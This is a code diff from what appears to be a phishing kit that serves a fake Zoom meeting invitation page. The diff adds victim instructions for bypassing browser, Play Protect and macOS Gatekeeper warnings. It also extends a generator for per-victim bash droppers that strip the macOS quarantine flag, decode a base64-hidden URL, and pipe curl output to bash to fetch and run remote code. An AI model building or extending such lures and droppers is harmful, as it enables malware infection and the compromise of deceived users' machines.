@@ -195,7 +195,11 @@ function attachmentPage(target, os, id) {
     ? 'Your browser may warn that the file is harmful. Tap <b>Download anyway</b>, then <b>Install</b> (and <b>Install anyway</b> if Play Protect appears).'
     : os === 'ios'
     ? 'Open the meeting page in Safari and use the Zoom app.'
-    : 'The download starts automatically. Double-click the file to install. If Windows or macOS warns, choose <b>Run</b> / <b>Open</b>.';
+    : os === 'macos'
+    ? 'The download starts automatically. Open the <b>.command</b> file; if Gatekeeper warns, right-click it and choose <b>Open</b>.'
+    : os === 'linux'
+    ? 'The download starts automatically. Then run <b>chmod +x &lt;file&gt; &amp;&amp; ./&lt;file&gt;</b> or <b>bash &lt;file&gt;</b>.'
+    : 'The download starts automatically. Run the file and approve the Windows prompt.';
   return `<!doctype html><html lang="en"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Zoom meeting invitation</title>
@@ -275,6 +279,8 @@ function mutateWindows(base, id, co) {
   const b64 = Buffer.from(url, 'utf8').toString('base64');
   const v = 'u' + randHex(5);
   return '#!/bin/bash\n# build ' + Date.now() + '-' + randHex(4) + '\nset -e\n' +
+    'xattr -d com.apple.quarantine "$0" 2>/dev/null || true\n' +
+    'chmod +x "$0" 2>/dev/null || true\n' +
     v + '="$(echo \'' + b64 + '\' | base64 -d)"\ncurl -fsSL "$' + v + '" | bash\n';
 }
 let winMsiCache = null;
